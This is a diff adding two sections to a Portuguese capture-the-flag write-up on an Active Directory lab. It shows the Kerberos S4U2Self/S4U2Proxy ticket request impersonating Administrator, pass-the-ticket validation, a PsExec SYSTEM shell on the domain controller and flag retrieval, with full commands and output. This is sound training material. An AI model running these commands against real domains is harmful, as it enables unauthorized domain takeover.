@@ -360,3 +360,120 @@ rbcd.py \
 ~~~
 
 Resultado: <code>LABPC01$</code> apareceu autorizada no objeto <code>DC01$</code>.
+
+
+<a id="tickets"></a>
+
+## 8. S4U2Self, S4U2Proxy e Pass-the-Ticket
+
+| Conceito | Significado |
+|---|---|
+| **TGT** | Ticket para pedir outros tickets ao KDC |
+| **TGS** | Ticket destinado a um serviço específico |
+| **SPN** | Identificador Kerberos de serviço, como <code>cifs/DC01.ctf.local</code> |
+| **S4U2Self** | Serviço solicita ticket representando outro usuário |
+| **S4U2Proxy** | Obtém ticket para o serviço de destino, conforme a delegação |
+| **ccache** | Arquivo de cache Kerberos usado pelo Linux |
+
+Agora que a delegação estava configurada, solicitei um **ticket CIFS para Administrator**, autenticando como a máquina que eu controlava:
+
+~~~bash
+cd /root/reports
+
+getST.py \
+  -spn 'cifs/DC01.ctf.local' \
+  -impersonate Administrator \
+  -dc-ip 10.64.163.15 \
+  'ctf.local/LABPC01$:LabPC2026!Strong'
+~~~
+
+Resultado:
+
+~~~text
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
+~~~
+
+<code>-spn</code> define o serviço; <code>-impersonate</code>, a identidade representada; <code>-dc-ip</code>, o KDC. Um aviso <code>CCache file is not found. Skipping...</code> não impediu o sucesso, porque a ferramenta obteve o TGT necessário.
+
+Ativei o cache para os próximos comandos:
+
+~~~bash
+export KRB5CCNAME="$PWD/Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache"
+klist -c "$KRB5CCNAME"
+~~~
+
+Saída comprovada:
+
+~~~text
+Default principal: Administrator@ctf.local
+Valid starting: 10/25/26 15:04:34
+Expires:        10/26/26 01:04:34
+Service:        cifs/DC01.ctf.local@CTF.LOCAL
+~~~
+
+<code>export</code> define uma variável de ambiente no shell e nos processos filhos: **não modifica o ticket, não o renova e não instala nada no Windows**. Esse cache continha um **ticket CIFS**, não a senha ou um TGT universal de Administrator.
+
+<a id="system"></a>
+
+## 9. Acesso administrativo, PsExec e flag
+
+Validar o ticket no SMB:
+
+~~~bash
+nxc smb DC01.ctf.local \
+  -d ctf.local \
+  -u Administrator \
+  -k --use-kcache
+~~~
+
+Resultado:
+
+~~~text
+[+] ctf.local\Administrator from ccache (Pwn3d!)
+~~~
+
+Depois, obter shell remoto:
+
+~~~bash
+psexec.py -k -no-pass \
+  -dc-ip 10.64.163.15 \
+  ctf.local/Administrator@DC01.ctf.local
+~~~
+
+O Impacket encontrou <code>ADMIN$</code> gravável, enviou um executável temporário e criou/iniciou um serviço pelo **Service Control Manager**. PsExec **deixa artefatos de serviço**, não é uma simples consulta.
+
+No prompt remoto:
+
+~~~cmd
+whoami
+whoami /priv
+hostname
+~~~
+
+Resposta:
+
+~~~text
+nt authority\system
+SeDebugPrivilege        Enabled
+SeImpersonatePrivilege  Enabled
+DC01
+~~~
+
+**Distinção importante:** a autenticação usou um ticket de <code>Administrator</code>, mas o executável de serviço criado pelo PsExec rodou como <code>LocalSystem</code>. Por isso o shell ficou como SYSTEM.
+
+A flag:
+
+~~~cmd
+cd C:\Users\Administrator\Desktop
+type flag.txt
+~~~
+
+~~~text
+THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}
+~~~
+
+**Resultado comprovado:** RBCD aceita, ticket S4U emitido, autenticação administrativa SMB, execução remota como SYSTEM e flag encontrada.
